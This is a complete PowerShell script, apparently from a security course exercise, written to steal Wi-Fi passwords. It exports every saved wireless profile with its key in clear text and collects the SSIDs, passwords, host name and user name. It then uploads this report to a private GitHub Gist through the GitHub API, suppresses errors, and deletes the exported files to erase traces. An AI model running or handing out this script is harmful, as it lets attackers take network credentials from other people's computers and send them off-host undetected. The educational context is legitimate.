# ============================================================
#  W02a.6 – WLAN-Passwörter exfiltrieren
#  Autoren: Raphael Bleier, Joachim Lugger
#  Exfiltration: Privates GitHub Gist (kein lokaler Server)
#
#  Setup: GITHUB_PAT durch eigenen Token ersetzen (Scope: gist)
# ============================================================

$GITHUB_PAT = "GITHUB_PAT_HERE"

$tmpDir = $env:TEMP
Push-Location $tmpDir

try {
    # WLAN-Profile mit Klartextpasswörtern exportieren
    netsh wlan export profile key=clear | Out-Null

    # <keyMaterial> = Passwort im Klartext
    $passwords = Select-String -Path "Wi-Fi-*.xml" -Pattern "<keyMaterial>(.*)</keyMaterial>" |
                 ForEach-Object {
                     $ssid = $_.Filename -replace "Wi-Fi-|\.xml", ""
                     $pass = $_.Matches.Groups[1].Value
                     "SSID: $ssid | Passwort: $pass"
                 }

    $report = "=== WIFI PASSWORDS | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===`n" +
              "Host: $env:COMPUTERNAME | User: $env:USERNAME`n`n" +
              ($passwords -join "`n")

    # Exfil via privates GitHub Gist
    $headers = @{
        "Authorization" = "token $GITHUB_PAT"
        "Content-Type"  = "application/json"
        "User-Agent"    = "git/2.40.0"
    }
    $body = @{
        description = "wifi_$(Get-Date -Format 'yyyyMMdd_HHmm')"
        public      = $false
        files       = @{ "wifi.txt" = @{ content = $report } }
    } | ConvertTo-Json -Depth 5

    try {
        Invoke-RestMethod -Uri "https://api.github.com/gists" `
            -Method POST -Headers $headers -Body $body | Out-Null
    } catch { }

} finally {
    # Spuren verwischen
    Remove-Item "Wi-Fi-*.xml" -Force -ErrorAction SilentlyContinue
    Pop-Location
}
